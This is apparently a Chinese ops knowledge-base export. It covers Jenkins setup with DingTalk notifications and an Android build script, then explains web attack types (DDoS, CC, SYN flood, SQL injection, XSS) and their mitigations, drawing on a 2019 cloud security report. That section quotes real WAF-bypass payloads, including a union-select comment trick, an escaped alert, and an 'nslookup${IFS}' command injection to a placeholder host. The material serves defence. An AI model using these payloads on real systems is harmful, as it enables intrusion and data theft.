(Simplified) 设定Jenkins中文方法 1.进入Manage Jenkins中，点击Manage Plugins（插件设定） 安装插件“Locale plugin”，虽然这个插件问题比较多，但是这个是Jenkins中唯一可以汉化的插件。 安装中文汉化语言包插件（Localization: Chinese (Simplified)）。 配置 钉钉 构建通知 在钉钉群中, 进入 群设置 >> 群机器人 >> 添加机器人 >> 添加自定义机器人 >> 配置 , 添加好后, 在机器人管理中选择添加的机器人, 保存在 webhook 中链接中的 access_token= 后的参数 进入 Jeknins, 在 插件管理 中搜索到 Dingding JSON Pusher 并安装, 安装完后打开项目配置, 在 构建后操作 一栏中, 增加构建后的步骤, 进入项目管理, 选择 钉钉通知器配置 , 参考下图配置, 钉钉access token就填入我们申请的 好了, 每次构建时都将在 钉钉中收到通知了 新版钉钉通知 我的Jenkins版本是V2.204.1，需要安装的插件： DingTalk Plugin 在 系统管理 > 系统设置 > 钉钉配置 中添加机器人 在项目中配置： 在钉钉群中有相关通知 Jenkins整合dingding json pusher，发送自定义消息到钉钉群 1、下载钉钉，建群，添加机器人，获得access_token； 2、下载插件 主页面-系统管理-管理插件-可选插件 搜Dingding JSON Pusher Plugin 3、其他项目配置完成后，添加构建后操作，选择Dingding JSON Pusher 4、钉钉access token填入access_token，不是整个路径只是路径后的access_token的值,比如 https://oapi.dingtalk.com/robot/send?access_token=xxxxxxxx,要填入的是xxxxxxxx； 5、Json文件路径，全路径，比如 /data/jenkins_data/workspace/android-test1/dingding.json 6、Json文件内容格式如下： { “msgtype”: “text”, “text”: {“content”: “在这填写自定义内容”}} 参考 https://blog.csdn.net/Ever69/article/details/84453896 使用Jenkins构建Android项目：https://www.jianshu.com/p/c9703b83ff4b Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/android-to-apk/3.Centos7-Android-jenkins.html":{"url":"doc/android-to-apk/3.Centos7-Android-jenkins.html","title":"基于centos7的jenkins安卓自动打包","keywords":"","body":"3.基于centos7的jenkins安卓自动打包 安装完成需要准备以下 在CentOS 7下构建安卓Android编译环境 安装jenkins 最后一步来自动or手动打包 需要在资料 1.jenkins项目名：安卓自动打包-小游戏-GameDev-Android-SDK 2.钉钉群助手 钉钉群-群设置-智能群助手，添加机器人：https://help.aliyun.com/document_detail/153691.html 获取： https://oapi.dingtalk.com/robot/send?access_token=XXXXXXXX 3.Git仓库： git@192.168.1.9:wxgame/GameDev-Android-SDK.git 目录： /data/android/ 手动操作： 1.拉取git仓库 # cd /data/android/ # git clone git@192.168.1.9:wxgame/GameDev-Android-SDK.git 2.打包 # cd GameDev-Android-SDK/Android #研发的安卓项目放在Android目录中 # ls build.gradle gradle gradle.properties gradlew gradlew.bat launcher local.properties settings.gradle unityLibrary # chmod +x gradlew 打包命令： ./gradlew :launcher:assembleRelease 如果没有报错 完成后，编译好的 apk 文件位于 launcher/build/outputs/apk/release 路径下。 如果有报错，则调试错误。 3.写shell脚本 vim /data/android/GameDev-Android-SDK.sh chmod +x /data/android/GameDev-Android-SDK.sh #!/bin/bash ############################################################ #名字： GameDev-Android-SDK.sh # vim /data/android/GameDev-Android-SDK.sh # chmod +x /data/android/GameDev-Android-SDK.sh #功能： 安卓自动打包 #作者： star #邮件： star@funet8.com #时间： 2021/08/18 #Version 1.0 ########################################################### # 克隆项目 # cd /data/android/ # git clone git@192.168.1.9:wxgame/GameDev-Android-SDK.git NowTime=`date +%Y%m%d-%H:%M:%S` Git_Name='GameDev-Android-SDK' Git_Path='/data/android/GameDev-Android-SDK' WebSite_Path='/data/wwwroot/web/android.7477.ltd' #进入项目拉取最新代码并且打包 cd $Git_Path git checkout master git pull cd $Git_Path/Android chmod +x gradlew ./gradlew clean ./gradlew :launcher:assembleRelease #拷贝apk包到站点下 cp $Git_Path/Android/launcher/build/outputs/apk/release/launcher-release.apk $WebSite_Path/$Git_Name-$NowTime.apk #删除15天前的文件 find $WebSite_Path -type f -mtime +15 -exec rm -f {} \\; jenkins后台配置 1.新建任务 2.输入名称 构建一个自由风格的软件项目 执行成功后钉钉通知 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/safe/readme.html":{"url":"doc/safe/readme.html","title":"服务器安全","keywords":"","body":"网络安全 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/safe/Web-safe.html":{"url":"doc/safe/Web-safe.html","title":"WEB服务器攻击类型和应对方案","keywords":"","body":"WEB服务器攻击类型和应对方案 WEB攻击类型 一、资源消耗型 多属流量攻击 压力测试 DDOS和cc攻击 羊毛党（抢红包、抢茅台、12306刷票） 利用打码、VPN代理、UA模拟、手机、电脑群控等 投票、刷广告黑产、做任务 刷CDN流量 二、数据获取型 多属漏洞攻击 爬虫(搜索引擎) 提权（获取网站后台、服务器管理权限、破解WiFi密码） 盗取WEB数据库数据（开房记录、CSDN用户数据） 白帽，测试漏洞研究 先看三个我司遇到的案例 肉鸡也称傀儡机，是指可以被黑客远程控制的机器。比如用\"灰鸽子\"等诱导客户点击或者电脑被黑客攻破或用户电脑有漏洞被种植了木马，黑客可以随意操纵它并利用它做任何事情。 正确地认识网络攻击 一个目的：造成较大的业务损失 两个方法：堵塞有限带宽，耗尽有限计算资源 三类攻击： DDos流量攻击 链接资源耗尽网络层CC攻击 应用资源耗尽类型攻击 其中三类攻击包括： 一、网络流量型攻击 这种攻击会利用到一些协议漏洞，比如UDP、SMP协议，很轻易地构造出过载大报文来堵塞网络入口，这就导致正常请求很难进入。 二、耗尽计算资源型攻击——连接耗尽 最典型的就是网络层CC，利用HTTP协议的三次握手，给服务器发一半的三次握手请求，后续的一些请求不再发了，所以服务器端就会等待，进而占用大量的资源，导致服务器连接资源直接被耗尽，服务不可持续。 三、耗尽计算资源型攻击——应用耗尽 典型是是7层的应用层CC攻击。这种攻击发出的攻击请求，从报文来看，看不出他有非常明显的畸形或有害性，很难去做相应的判断。由于七层CC都是正常的业务请求，同时CDN只是缓存内容，并不了解业务逻辑，同时业务也经常会遇到客户业务突发，当CC攻击时，如果无特殊的错误码异常，从CDN角度来看会和正常的业务上量是一样的，因此也会尽力服务。进而CC攻击会形成突发带宽峰值，进而产生高额账单，因此给客户造成了较大的经济损失。 DDOS是什么 百度百科-DDOS-分布式拒绝服务攻击 分布式拒绝服务(DDoS:Distributed Denial of Service)攻击指借助于客户/服务器技术，将多个计算机联合起来作为攻击平台，对一个或多个目标发动DDoS攻击，从而成倍地提高拒绝服务攻击的威力。通常，攻击者使用一个偷窃帐号将DDoS主控程序安装在一个计算机上，在一个设定的时间主控程序将与大量代理程序通讯，代理程序已经被安装在网络上的许多计算机上。代理程序收到指令时就发动攻击。利用客户/服务器技术，主控程序能在几秒钟内激活成百上千次代理程序的运行。[百度百科] DDoS攻击的演变 第一个阶段：DoS攻击（单机） 基于一个单点的服务器进行攻击流量的发送。这时流量规模在500Mbps到10Gbps之间，由于传统服务器的硬件、服务性能、带宽水平都有限，在这样的流量规模之下，就可以造成服务器的全面瘫痪，甚至终止。通过对传统硬件设备直接进行流量清洗的单点防护，再回到服务器，就可以达到防御目的。同时，也可以对相应的原IP进行封禁。 第二阶段：DDoS攻击（分布式） 也就是分布式的DoS攻击，它的攻击源就不是单点的服务器，而是一群僵尸网络，黑客通过系统漏洞在网络上抓取大量肉鸡，运用这些肉鸡在不同的网络里去同时发起攻击，造成的带宽规模可能从10Gbps到100Gbps。对这种分布式的僵尸网络攻击形式，通常防御手段就是用多点的大流量清洗中心去做近源的流量压制，之后再把清洁流量注回到服务器。 第三阶段：DRDoS，分布式反射型拒绝服务攻击。 互联网上的肉鸡抓取可能存在困难，但一旦被发现，很快这个周期就会丢失掉。所以这些僵尸网络在控制一定的这个周期数量后，会通过反射的机制向目标主体进行攻击。反射的主要机制是互联网上公共的真实存在的设备，在处理协议的过程中可能会形成一个攻击流量成本的放大，比如请求NTP 10K返回50K，请求的原地址改成目标服务器，所有终端都以为受害主机在请求，所有请求都会回到受害主机。整个流量可能会从100Gbps到2Tbps之间，所以对于这种攻击一个是要在很多的协议源头去做流量的阻断，另一个就是还要通过全球化分布式的DDoS进行相应防御。 实例：Memcache-DRDos实践-实现核弹级DDoS攻击：https://www.freebuf.com/column/164095.html 发出去58字节，收到543224字节 543224/58=9365.93倍 这一个就那么厉害，如果更多那后果可想而知~~~~ 全球开放的Memcache有数十万之多 第四阶段：未来发展 未来，5g、IPv6和IoT技术发展，会导致单位攻击能力翻10倍、公网IP数量指数增长以及潜在肉鸡无处不在，都是我们将要面临的一些风险。所以未来的攻击规模可能会超过2Tbps甚至更高。 来源：正确使用CDN 让你更好规避安全风险@阿里云云栖号 https://developer.aliyun.com/article/780212 案例1：某站受到分布式网络攻击，CPU正常，网络入口堵满，网站无法正常提供服务。 这是典型的DDoS发包攻击，发包攻击主要针对以下几种目标： 占带宽，让目标服务器接受不到新的请求，从而达到拒绝服务的目的。 溢出攻击，因伺服系统、操作系统的一些未修复的漏洞，让攻击者探测到，攻击者则可以依此用非常小的代价实现让目标服务器死机、重启、甚至被提权。 此案例属于1情况，攻击者发包的目的就是为拼带宽实现拒绝服务。若是托管在普通机房，没有流量清洗能力的，很快你服务器IP会被机房网关null（网关封了你服务器IP）严重的还会被下架。 若是在阿里云，云盾可以起到一定的防护作用，官方公布的数据是可防20G，承诺免费防护300M。为了防止有漏网之鱼，掌握常用的iptables命令是必要的（http://bbs.aliyun.com/read/107407.html? 特别是4中的封禁IP的命令 ），毕竟机器不是人，不可能有人工那么智能，而且发包攻击若量较小的时候，很容易被防火墙放过，所以最好、最万无一失的解决之道就是在云主机上封禁IP，配合云盾将服务器受到的影响降到最低。 为防止被溢出攻击，需要日常多关注下系统漏洞，及时为自己的主机打上补丁。 案例2：某网站受到攻击，CPU占满，流量并不高，但网站完全无法打开了。 排除正常业务的访问量 这是CC攻击（通过某些攻击工具伪造大量僵尸请求，让目标某部分资源耗尽）的特征，首先，你需要明确一个事情，此时WEB服务继续进行，高CPU占用将会成为你在云主机上操作的负担。 CC攻击 百度百科-cc攻击, https://baike.baidu.com/item/cc%E6%94%BB%E5%87%BB?fr=aladdin 百度百科定义：攻击者借助代理服务器生成指向受害主机的合法请求，实现DDOS和伪装就叫：CC(ChallengeCollapsar)。 CC主要是用来攻击页面的。大家都有这样的经历，就是在访问论坛时，如果这个论坛比较大，访问的人比较多，打开页面的速度会比较慢，访问的人越多，论坛的页面越多，数据库压力就越大，被访问的频率也越高，占用的系统资源也就相当可观。 DDOS和cc攻击的特点 1.cc攻击是DDOS的一种。 最明确的区别就是，虽然它们攻击的类型不同，但是CC攻击和DDOS的都属于同一种类型，因为它们的设计思想是一样的，它的诞生是利用TCP/IP 协议的缺陷，它们的原理 DDOS攻击又称“分布式攻击”，它使用非法数据淹没网络链路，这些数据可能淹没Internet链路，导致合法数据流被丢弃，DDOS攻击比旧时代的DOS（拒绝服务）更可怕，规模极大，通常他们是以几百台机子或甚至几万台以上的机子进行以点试图掩没攻击为目标，使目标机子在1分钟内变成瘫痪现象，一下子接受那么多数据包，它就算是台巨型机的速度，也不能达到一下子处理几千台或几万台机子攻击目标的现象啊，相同，洪水攻击也是这类攻击的一种 DDOS攻击不仅能攻击计算机，还能攻击路由器，因为路由器是一台特殊类型的计算机； 网速决定攻击的好和快，比如说，如果你一个被限制网速的环境下，它们的攻击效果不是很明显，但是快的网速相比之下更具有效果 2.CC攻击它的隐藏性非常强 不管是它的IP还是它的流量，隐藏性都非常高，它的原理是以主页为主要攻击类型（后期还可以加代理性攻击手法），攻击手法是以论坛的用户为这一特点，进行模拟似的攻击。 现在你知道它们的的不同之处只是类型的不同而已，相比之下，CC攻击更为主流攻击！ 3.cc资源攻击ddos流量攻击 CC攻击主要是网页攻击，而DDOS攻击是进行发送大量的数据包给目标，造成目标服务瘫痪。 一句话总结：CC攻击和DDOS攻击的主要是针对 WEB 应用程序比较消耗资源的地方进行疯狂请求。 DDOS攻击原理是我生成一个DDOS客户端 在网络上散播，等人家打开后 当然不只一台电脑，我可以用我的客户端一个命令让所有被我植入控制端的电脑向一个网站发送访问请求，比如我有几百万太电脑被我控制 如果每台电脑发送一个访问请求 网站如果处理不过来会瘫痪 CC攻击呢可以只使用一台电脑 然后用代理进行攻击。 DDOS治理和缓解 究其本质无法防御，优化服务器部署，提升网络带宽。 网络架构上做好优化，采用负载均衡分流 确保服务器的系统文件是最新版本，并及时更新系统补丁 添加抗DDoS设备，进行流量清洗 限制同时打开的SYN半连接数目，缩短SYN半连接的 timeout时间 限制单IP请求频率 防火墙等防护设置禁止ICMP包等 运行端口映射程序或端口扫描程序，要认真检查特权端口和半特权端口 关闭不必要的服务 认真检查网络设备和主机/服务器系统的日志。只要日志出现漏洞或是时间变更，那这台机器就可能遭了攻击 限制在防火墙外与网站文件共享，这样会给黑客截取系统文件的机会，主机的信息暴露给黑客，无疑是给了对方入侵的机会 加钱堆机器 报警 软件防护策略 1.nginx+Lua+redis（ip） 2. VeryNginx 3. openrestry 4. 第三方云防火墙 5. 硬件防火墙 1.专用硬件 Web 服务器的前面可以架设硬件防火墙，专门过滤请求。这种效果最好，但是价格也最贵。 2.本机防火墙 Linux 服务器一般使用 iptables。比如，拦截 IP 地址1.2.3.4的请求，可以执行下面的命令。 iptables -I INPUT -s 1.2.3.4 -j DROP 3.WEB-nginx和apache拦截 4.封禁特定IP和UA HTTP 请求的特征一般有两种：IP 地址和 User Agent 字段。比如，恶意请求都是从某个 IP 段发出的，那么把这个 IP 段封掉就行了。或者，它们的 User Agent 字段有特征（包含某个特定的词语），那就把带有这个词语的请求拦截。 5.带宽扩容 6、CDN CDN 指的是网站的静态内容分发到多个服务器，用户就近访问，提高速度。因此，CDN 也是带宽扩容的一种方法，可以用来防御 DDOS 攻击。这里有一个关键点，一旦上了 CDN，千万不要泄露源服务器的 IP 地址，否则攻击者可以绕过 CDN 直接攻击源服务器，前面的努力都白费。 阿里云WAF-2019年Web应用安全年度报告 完整文档 ：http://z.xgss.net/file/1/%E6%8A%80%E6%9C%AF%E7%B1%BB%E4%B9%A6%E7%B1%8D/2019%E5%B9%B4Web%E5%BA%94%E7%94%A8%E5%AE%89%E5%85%A8%E5%B9%B4%E5%BA%A6%E6%8A%A5%E5%91%8A.pdf 1. 为什么我总抢不到茅台酒？ 2. 重要活动保障我该如何准备？ 3. 如何在降低误漏报的路上越走越远？ 4. 什么才是电商和游戏行业风控的基石？ 5. 你的API还在裸奔吗？ 针对攻击者的信息收集，可以做这些来减少信息泄露风险 防守方如何防御 1.使用CDN/WAF等网络或者安全产品隐藏域名真实源站IP，并做好源站IP访问控制； 2.管理后台和门户内容站点分离，在相同域名下则需要通过ACL做好后台的访问控制； 3.对外提供的顶级域名尽可能独立，内部系统不要和外部应用使用相同的顶级域名，防止攻击者通过DNS爆破等手段获取到内部系统的DNS记录信息；4.内部系统不开放在公网，使用内网DNS提供域名解析服务，使用VPN等方式接入内网后登陆； 5.证书不要使用包含内部域名的多域名证书，防止证书带来的域名信息泄露，减少攻击面。 什么才是电商和游戏行业风控的基石（羊毛党）？ 在电商、游戏等行业里面，常常会有新用户注册奖励、老用户推荐注册奖励之类的运营拓新活动，或者类似”小号养大号“的成长机制，另外在很多抢购活动（如上面提到的茅台以及潮鞋等稀缺爆款）中商家也会限制每个用户的购买数量上限。这些活动一旦被羊毛党和黄牛党盯上，往往起不到预期的营销效果，投入的大量运营成本基本都落入了黑灰产的手里。这里面一个核心的问题就是账号安全，黑灰产通过虚假注册或是撞库/暴力破解等手段囤积大量账号（不管是虚假注册的小号还是正常用户被盗的账号），有了这些账号后，不论是自动化批量下单来抢购商品，还是大量获取新用户注册的奖励，亦或是更复杂的以号养号，都变得轻而易举。 因此，账号安全已经成为当代电商、游戏甚至整个互联网行业的业务风控基石。而Web业务（不管是网 页、小程序、APP、API、H5还是公众号等等）承载了99%以上的账号业务入口（注册、登录、找回密 码等等），这些入口也成为了黑灰产获取账号的最主要途径，要得到企业足够的重视。 真实的攻击情况如何呢？ 以阿里云WAF的一个游戏用户为例，单纯以123456这个弱密码撞库的请求量每小时就达1200万，而且这样的攻击是周期性的每天都在持续好几个小时。放在全网维度，我们每天统计到参与账号安全攻击的IP有50万+，参与针对一个金融行业用户账号接口攻击的IP数量可达10万/天。而这还只是保守估计，真实数字会大很多。 保护账号接口有很多手段 接口加签、限制高频请求源、部署各类验证码等等都可以 不一定直接的封禁，跟运营同学联手，将你们检测出的问题账号在事后通过运营策略来处置，效果更好。 为什么要关注API安全 根据阿里云安全团队的观察发现，API方式交互数据的网站，60%以上的网站流量以API形式传输交互。 API安全的风险有哪些 由于API接口相对于Web应用的前端页面而言，往往隐藏于后端，因此更多的安全问题没有被发掘和重视，除了敏感数据泄漏，越权查看修改等逻辑，API也依然会面对传统的Web攻击，如JSONP劫持、跨站脚本攻击、SQL注入攻击、恶意文件上传等，黑客可以通过未鉴权的API直接入侵到黑客服务器，获取服务器权限。 Web攻击态势分析 整体攻击态势 攻击类型分布 攻击源分布 从地域上来看，国内攻击最多的省份还是浙江省，其次是江苏、香港、北京、上海等发达省级行政单位。根据2018年国家统计局数据，香港和浙江的总人口比例约为1/7，但是攻击却达到了40%以上，是中国攻击源最密集的来源。 境外攻击的80%以上均来自于美国，占比高达82%。 流量客户端 从攻击源的客户端信息来看，全网的正常流量与攻击流量在客户端类型分布上存在着较为明显的差异，且攻击流量中异常的客户端分布情况存在值得挖掘的地方。 在正常流量中，Android、IOS等移动端的访问流量累计占据了较大比例，其他客户端如浏览器、搜索引擎爬虫、各类开发工具等也占据前列。 而在攻击流量中，Chrome、IE浏览器则是一骑绝尘，总计占比超过99%。但这并不是说移动端Web应用很少被攻击，也并不代表Chrome、IE等浏览器是目前最主要的攻击载体。出现这种现象的原因是在Web攻击中，各类扫描器、攻击工具等大多会采用伪造UA的方式进行攻击，而其伪造的对象则集中在Chrome、IE等最主流的浏览器中。根据我们的分析发现，在攻击流量中声称自己是所谓Chrome、IE以及各类常见搜索引擎爬虫等客户端的源，有超过99.67%是由各类扫描器、攻击脚本等伪装的。 时间变化趋势 从攻击现象趋势来看除了春节期和小长假期间攻击量明显减少，其它时间基本处于一个平稳中略有上升的状态。 重点行业分布 从行业来看，攻击主要集中在互联网、科研教育、租赁和商务服务、电商4个行业，攻击总量占比超过了90%，这也跟目前这4个行业的请求占比基本对应。 攻击手法剖析 攻击流量特征 在针对Web服务的攻击中，扫描器及各类自动化攻击工具占据绝大部分比例。根据当前的数据保守计算，在所有针对Web服务的攻击流量中，自动化工具占比超过70%。这些工具的攻击方式涵盖了目录扫描、SQL注入、XSS、命令执行、漏洞探测等多种威胁类型。 图示是攻击者最常探测的部分敏感目录文件。其中包括一些Web框架或服务器的默认配置文件，也包括一些攻击者想要螳螂捕蝉，黄雀在后的尝试较为常见的Webshell文件名称。 重点攻击目标 其中WebLogic Server远程命令执行(CVE-2019-2725)的拦截数量最多，从2019年4月漏洞爆发到年末攻击拦截数量共计851684次，之所以该漏洞攻击次数较多的原因是WebLogic Server远程命令执行(CVE-2019-2725)漏洞利用了XMLDecoder，攻击协议使用的是http协议，无需出网，所以比起其它WebLogic Server漏洞利用条件很低，因此成为很多挖矿、勒索程序的主要利用漏洞。值得一提的是，WebLogic Server是美国甲骨文（Oracle）公司开发的一款适用于云环境和传统环境的应用服务中间件，被广泛应用于保险、证券、银行等金融领域，所以这些领域的客户在使用WebLogic Server部署网站业务时，请及时购买Oracle官方账号更新补丁，以防被黑客入侵。经过观测值得一提的现象是，每次Web漏洞被披露后，当安全研究员公开PoC的2-3天后就开始出现大规模的互联网扫描行为。 另外，国内主流OA系统、泛微OA系统也多次爆发远程命令执行和敏感信息泄漏漏洞，国内客户受影响较多，建议国内使用泛微OA系统的客户尽快升级，尽量不要把OA系统开放在互联网上，以防止被黑客攻击造成勒索和数据泄漏。 攻击变形 随着WAF对网站的防护越来越普及，针对基础Web攻防来说，利用诸如MySQL、JavaScript、Html语言特性进行各种编码、变形，从而绕过WAF防护的攻击payload也越来越多，攻防是一个持续对抗升级的过程。根据阿里云安全团队的观察发现，当前已有超过1/3的攻击数据采用了不同程度或类型的编码、变形手段，以期绕过安全防护，其中甚至不乏使用多维度的复合变形、编码手段实施攻击。目前云 上已经发现的不同类型攻击的绕过比例如下图所示： 例如： 对于x s s 弹窗攻击行为， 现在越来越来越多攻击p a y l o a d 会进行编码进行攻击： alert-->\\u0061\\u006c\\u0065\\u0072\\u0074，传统WAF或者IPS设备只会对alert这样的特征关键字拦截，但是黑客也会了解WAF或者IPS设备防御原理，从而针对性的使用不同语言特殊用法进行绕过防护设备攻击。下面是一些真实的案例攻击： ·x=1 /*!10000union*//**/select 1,2,3 ·x=\\u0061lert(1) ·x=nslookup${IFS}abcdefg.xxx.com ·x=第一种是混合利用MySQL的内联注释与注释进行绕过攻击； 第二种是利用JavaScript特殊的宽编码进行绕过； 第三种是利用Linux环境变量符号进行绕过； 第四种是利用变形eval、混合运算、非闭合php代码标签进行绕过 爬虫分析 1、流量分析 行业分布 根据使用阿里云爬虫风险管理产品的用户流量统计，房产交易、交通、游戏、电商、资讯论坛几个行业中恶意爬虫的占比都超过了50%。 这些行业的用户有一个显著的特点是，他们往往对外提供的服务内容有着很强的时效性，比如不同城市的新上房源、不同线路的票务信息、商品价格、简历信息等等，所以会吸引大量爬虫持续的爬取以获取最新的资讯。比较特殊的一个是游戏行业，爬虫则总是聚焦在虚假账号和挂机两个经典场景。 地域分布 从区域来源上看，东南亚和美国的流量中恶意爬虫的占比相对较高，当然爬虫的绝对数量上看还是中国大陆占据大头。随着近些年国内黑灰产的专业程度越来越高，手上掌握的全球代理IP资源也越来越丰富，IP层面的对抗已经非常艰难，防护要更多的考虑其他的维度，如设备指纹、异常行为分析、威胁情报以及业务层面的对抗。 从国内的省份分布来看，北京、江苏、浙江分列爬虫流量占比的前三位，随着秒拨IP的全面普及，爬虫的来源分布会越来越模糊，“大隐隐于市”，最终无限逼近真实用户的分布情况： ISP分布 从爬虫来源运营商的请求量绝对值分布来看，三家运营商和阿里云占就据了约98%的流量： 爬虫分级 机器流量手法分级,我们按照机器流量攻击的复杂度和防御难度，对构建机器流量的手法进行分级： 【简单接口爬虫】：直接构造脚本请求，或使用开源爬虫框架进行攻击的初级攻击者 【协议伪造者】：尝试在协议、网络指纹、操作链路方面与风控系统进行对抗，拥有将脚本流量尽可能伪造成正常人流量或搜索引擎流量的攻击者 【driver玩家】：通过driver协议，编写脚本直接控制浏览器进行自动化操作（如WebDriver、Marionette等）的攻击者 【系统层模拟攻击】：通过软件直接在系统底层生成操作事件消息（如按键精灵、API宏等）的方式伪造行为，控制系统中的定制化浏览器的攻击者。利用手机模拟器的攻击手法也被归为此类当中（auto.js） 【真机群控】：通过软件将某个正常人操作行为镜像+微小偏移，同时操作多个浏览器或手机真机，并使用一些反指纹插件/改机框架对抗client指纹的攻击者 【分布式真人】：通过有偿支付或偷偷收集的方式，让大量真人与真机帮助操作，针对业务发起流量的攻击方式 可以看到，使用“简单接口爬虫”发起机器流量的攻击事件虽然占比不多，但是这部分攻击手法贡献了大量机器流量，他们用类似“野蛮爬取”的策略，毫无节制的向业务各个链路节点发送大量机器请求。而driver玩家虽然在攻击事件/团伙中占比较大，但在流量分布中占比却不多，这类攻击更加偏向于精细化攻击，不会无节制的大量爬取。 特征篡改能力分级 在机器流量对抗过程中，需要依赖流量的各种网络层、客户端层、业务层特征进行人机识别与对抗。与此对应的便是攻击者各式各样的特征伪造方式。我们按照特征篡改/伪造手法和复杂程度，将特征篡改进行如下分类： 【无力伪造】：不对当前请求的端特征（包括ua、header等）进行任何伪造 【低级伪造】：仅仅有伪造UA、header能力，或仅仅有对端采集信息上报进行重放攻击能力 【工具伪造】：熟练使用各类浏览器反指纹插件，或是移动端改机框架进行特征篡改 【自研环境】：通过改造/二次编译浏览器，或是自定义ROM或自行研发改机框架进行特征篡改 【协议破解】：破解并分析出了客户端采集的特征，以及对应的加密上报协议，直接在字符串层面上对上报信息进行破解或篡改 低级伪造类的攻击者无论在流量分布还是在攻击事件分布上，都占有绝大部分比例。同时随着攻击手法精细化，不少特征篡改工具以越来越低的成本、越来越强的功能，开始支撑越来越多有丰富人机对抗经验的专业型攻击者。另外，随着以火狐、Chrome为代表的浏览器及其厂商愈发重视隐私保护以及愈发开放定制化功能，会有更多产业中的相关团伙使用自定义浏览器或是自定义ROM进行精细化攻击。 案例分析：某酒类线上商城业务 业务方——某酒类线上商城 a. 业务层面：（业务受到影响） 黄牛将核心该酒类商品的抢购权利垄断，会致使正常人无法通过商城购买到该酒类 b. 技术层面（负载增大）： 黄牛脚本无节制的轮询、注册、调用会对商城源站产生极大的负载压力，在秒杀峰值情况下甚至会出 现服务器被脚本拖宕机的情况。另外黄牛使用的大量垃圾账号也会对服务存储、短信验证等造成额外 的成本开销。 攻击者——“软件党”黄牛 a. 商品库存监控（判断是否有货） b. 商品秒杀抢购（生成订单接口） c. 业务辅助类脚本（大量账号、盗号、累计积分、暴力撞库、猜短信验证码） 防御方——antibot解决方案 a. 商品库存监控脚本对抗 b. 下单接口脚本对抗 c. 业务辅助类脚本对抗（频次控制+请求加签+验证码相结合） d. CC防护能力（通过CC策略来确保在黄牛的疯狂攻击下，源站不会受到影响） 报告总结 1.电商等行业面临的黑灰产链条更加完整和专业，利益驱动+更加先进的攻击技术利用将会让企业付出更多的安全和风控成本来进行防御； 2.传统Web防御随着API、加密流量等环境的变化而面临更多的挑战； 3.2020年各个行业在面临更多更严峻的外部Web安全威胁的同时，内部对安全水位的要求以及来自蓝军的模拟攻击也会越来越专业化，这对企业自身的安全能力提出了更大的挑战。 来源：《2019年Web应用安全年度报告——阿里云安全团队》 SYN攻击 百度百科-SYN攻击 SYN攻击是黑客攻击的手段。SYN洪泛攻击的基础是依靠TCP建立连接时三次握手的设计。第三个数据包验证连接发起人在第一次请求中使用的源IP地址上具有接受数据包的能力，即其返回是可达的。 TCP SYN Flood TCP SYN Flood是一种常见，而且有效的远端(远程)拒绝服务(Denial of Service)攻击方式，它透过一定的操作破坏TCP三次握手建立正常连接，占用并耗费系统资源，使得提供TCP服务的主机系统无法正常工作。 百度百科-SYN_RECV # netstat -n |grep ^tcp |awk '{print $NF}' |sort |uniq -c |awk BEGIN'{print \"状态\\t\\t连接数\"} {print $2\"\\t\"$1}' 状态 连接数 ESTABLISHED 131 SYN_RECV 1 TIME_WAIT 3569 ESTABLISHED 意思是建立连接。表示两台机器正在通信。 TIME_WAIT 这个套接字已经关闭，正在等待远程套接字的关闭传送[FIN、ACK、FIN、ACK都完毕，这是主动方的最后一个状态，在过了2MSL时间后变为CLOSED状态] SYN_RECV 是指,服务端被动打开后,接收到了客户端的SYN并且发送了ACK时的状态。再进一步接收到客户端的ACK就进入ESTABLISHED状态。 一般情况下，可以一些简单步骤进行检查，来判断系统是否正在遭受TCP SYN Flood攻击。 1、 服务端无法提供正常的TCP服务。连接请求被拒绝或超时。 2、透过 netstat -an 命令检查系统，发现有大量的 SYN_RECV 连接状态。 检查服务器链接，SYN_RECV状态最高时有200多个，访问服务器网页特别慢，甚至超时，所以基本判定是SYN_RECV攻击。 阮一峰：如何有效防范DDOS攻击 Web安全：最常见的Web安全攻击 防范羊毛党：运营同学必看的防薅羊毛技术完全解读 https://www.cnwebe.com/articles/60403.html WEB攻击 1.SQL注入 什么是SQL注入 SQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。 [百度百科] 网站都大多选择PHP、.Net、 Java、 ROR、 Python、NodeJS等编程语言搭建网站的后台，选择Mysql、 Oracle、SQL Server等数据库来存储数据。SQL注入就是针对的这样的网站发起的攻击。假如有一个列表页面，请求URL是这样的： https://xxx.xxx/list.php?q=finished 通过这个url可以获取这个用户列表下面所有已经完成的订单。那么我们可以猜想这样的页面后端对应的程序是这样写的： $sql = ‘select * from orders where status=\\’’ . status. ‘\\’ and userId = \\‘’ . userId; 语句本身没有什么问题，后面加上了过滤条件userId只能获取这个用户自己的订单。可是，如果我们这样发起请求： https://xxx.xxx/list.php?q=finished‘-- 最终拼接后的语句可能就变成了这个样子： select * from orders where status=‘finished’—and userId=’xxxx’; 由于“—”在数据库里面起到的注释作用，所以“and userId=’xxxx’” 这个过滤条件是不会起作用的。这个语句执行的效果就是黑客获取了这个网站所有已经完成的订单数据。 防范sql注入 做好参数检验。 sql传参的地方一定要做sql escape，对sql敏感字符进行转义。 不要直接拼接字符串。 2.脚本注入 脚本注入只是个表现形式，例如你的网页中出现了一段莫名的脚本： 这就是一个典型的脚本注入。 但是注入的方式就有很多了， 直接获取了服务器的权限，修改了网页； 利用Sql注入技术注入了脚本； 利用网页交互漏洞注入的脚本； 开发出了脚本注入漏洞扫描和Sql漏洞注入扫描自动机扫描互联网上的网站漏洞。 利用脚本注入这样的方式，黑客可以做很多很多事情： 挂马，修改页面内容，将客户跳转到指定的网站，流量导入，信息收集等。 当某天你的网站跳转到成人、赌博网站可能遭受到脚本注入攻击。 3.XSS(cross site scripting)跨站脚本攻击 什么是XSS XSS是指恶意攻击者利用网站没有对用户提交数据进行转义处理或者过滤不足的缺点，进而添加一些代码，嵌入到web页面中去。使别的用户访问都会执行相应的嵌入代码。从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。 严格来说XSS应该属于脚本注入的一种方式，只是因为XSS这种方式可以快速轻易的注入脚本而使得它非常流行。举个简单的例子： 有一个网站支持评论和回复，有人在评论框内输入了这么一段脚本： var i = document.createElement(‘img’); i.setAttribute(‘src’, 